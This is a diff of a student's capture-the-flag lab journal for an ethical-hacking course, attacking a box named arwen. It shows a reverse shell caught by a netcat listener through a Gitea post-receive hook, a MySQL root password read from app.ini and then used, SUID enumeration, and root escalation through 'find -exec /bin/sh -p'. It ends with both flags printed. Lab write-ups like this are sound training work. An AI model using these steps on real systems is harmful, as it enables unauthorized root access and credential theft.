@@ -143,7 +143,7 @@ branch 'master' set up to track 'origin/master'.
 ┌──(champuser㉿kali)-[~/ChamplainTechJournals/eth-hack-sec335/final]
 ```
 
-getting git user access
+when the post-receive script runs, it will start a reverse shell that our listener will read
 ```
 ┌──(champuser㉿kali)-[~/ChamplainTechJournals/eth-hack-sec335/final]
 └─$ nc -nlvp 4479               
@@ -154,20 +154,139 @@ bash: no job control in this shell
 git@arwen:~/gitea-repositories/arwen/nqaxsvw.git$ 
 ```
 
+we need to get access to arwen first, then to root
+```
+git@arwen:~/gitea-repositories/arwen/nqaxsvw.git$ find / -name "user-flag.txt"
+<ies/arwen/nqaxsvw.git$ find / -name "user-flag.txt"
+/home/arwen/user-flag.txt
+git@arwen:~/gitea-repositories/arwen/nqaxsvw.git$ find / -name "root-flag.txt"
+<ies/arwen/nqaxsvw.git$ find / -name "root-flag.txt"
+/root/root-flag.txt
+```
+
+
 
 ```
 git@arwen:~/gitea-repositories/arwen/nqaxsvw.git$ mysql --version
 mysql --version
 mysql  Ver 8.0.30-0ubuntu0.22.04.1 for Linux on x86_64 ((Ubuntu))
 ```
+all vulnerabilities seem to be DoS, which isn't very useful for gaining access
+
+<img width="787" height="310" alt="image" src="https://github.com/user-attachments/assets/585f8d3e-f9b8-4791-9598-3da479d7b4dd" />
 
 
+however, database credentials for gitea are stored in /etc/gitea/app.ini
+```
+[database]
+DB_TYPE  = mysql
+HOST     = 127.0.0.1:3306
+NAME     = gitea
+USER     = root
+PASSWD   = SecurePassworD
+SCHEMA   =
+SSL_MODE = disable
+CHARSET  = utf8
+PATH     = /var/lib/gitea/data/gitea.db
+```
 
 
+git@arwen:~/gitea-repositories/arwen/nqaxsvw.git$ mysql -u root -pSecurePassworD
 
 
+find / -user git | grep -v "^/var/lib/gitea" | grep -v "^/proc"  | grep -v "^/home/git"
+```
+git@arwen:~$ find / -user arwen | grep -v "^/proc" | grep -v "^/sys/fs/cgroup"
+<rwen | grep -v "^/proc" | grep -v "^/sys/fs/cgroup"
+...
+/home/arwen
+/home/arwen/.cache
+/home/arwen/.cache/motd.legal-displayed
+/home/arwen/.lesshst
+/home/arwen/.bash_logout
+/home/arwen/user-flag.txt
+/home/arwen/.bashrc
+/home/arwen/.mysql_history
+/home/arwen/.profile
+/tmp/passwd
+/dev/pts/4
 
 
+git@arwen:~$ ls /tmp/passwd -l
+ls /tmp/passwd -l
+-rw-r--r-- 1 arwen arwen 1912 Apr 14 15:57 /tmp/passwd
 
+```
 
+find files with SUID permissions
+```
+git@arwen:~$ find / -perm -4000 -type f 2>/dev/null
+find / -perm -4000 -type f 2>/dev/null
+/usr/bin/find
+/usr/bin/chsh
+/usr/bin/mount
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/fusermount3
+/usr/bin/pkexec
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/su
+/usr/libexec/polkit-agent-helper-1
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2717/usr/bin/chfn
+/snap/core20/2717/usr/bin/chsh
+/snap/core20/2717/usr/bin/gpasswd
+/snap/core20/2717/usr/bin/mount
+/snap/core20/2717/usr/bin/newgrp
+/snap/core20/2717/usr/bin/passwd
+/snap/core20/2717/usr/bin/su
+/snap/core20/2717/usr/bin/sudo
+/snap/core20/2717/usr/bin/umount
+/snap/core20/2717/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2717/usr/lib/openssh/ssh-keysign
+/snap/core20/2769/usr/bin/chfn
+/snap/core20/2769/usr/bin/chsh
+/snap/core20/2769/usr/bin/gpasswd
+/snap/core20/2769/usr/bin/mount
+/snap/core20/2769/usr/bin/newgrp
+/snap/core20/2769/usr/bin/passwd
+/snap/core20/2769/usr/bin/su
+/snap/core20/2769/usr/bin/sudo
+/snap/core20/2769/usr/bin/umount
+/snap/core20/2769/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core20/2769/usr/lib/openssh/ssh-keysign
+git@arwen:~$ 
+```
+
+/usr/bin/find is unique in that it shouldnt have these permissions
+```
+git@arwen:~$ stat /usr/bin/find
+stat /usr/bin/find
+  File: /usr/bin/find
+  Size: 282088          Blocks: 552        IO Block: 4096   regular file
+Device: fd00h/64768d    Inode: 656020      Links: 1
+Access: (4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
+Access: 2026-04-14 06:25:01.598992599 +0000
+Modify: 2022-03-23 13:52:12.000000000 +0000
+Change: 2022-08-17 11:07:45.501027033 +0000
+ Birth: 2022-05-24 19:03:57.289351040 +0000
+
+git@arwen:~$ find . -exec /bin/sh -p \; -quit
+find . -exec /bin/sh -p \; -quit
+# whoami
+whoami
+root
+# cat /home/arwen/user-flag.txt
+cat /home/arwen/user-flag.txt
+"f699c7be-5c3d-413b-9c65-fb1a9790200f"
+# cat /root/root-flag.txt
+cat /root/root-flag.txt
+"c21acd35-d741-4090-b2ca-341f70f2f471"
+# 
+```
 
